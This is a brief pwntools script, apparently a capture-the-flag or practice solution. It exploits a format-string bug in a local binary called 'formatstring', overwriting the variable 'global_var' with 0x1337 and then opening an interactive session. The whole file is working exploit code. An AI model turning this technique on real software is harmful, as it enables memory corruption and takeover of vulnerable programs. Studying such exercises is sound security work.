from pwn import *
import subprocess

elf = context.binary = ELF("./formatstring")

r = process(elf.path)

writes = {elf.symbols["global_var"]: 0x1337}
payload = fmtstr_payload(6, writes, write_size="byte")
r.sendline(payload)

r.interactive()
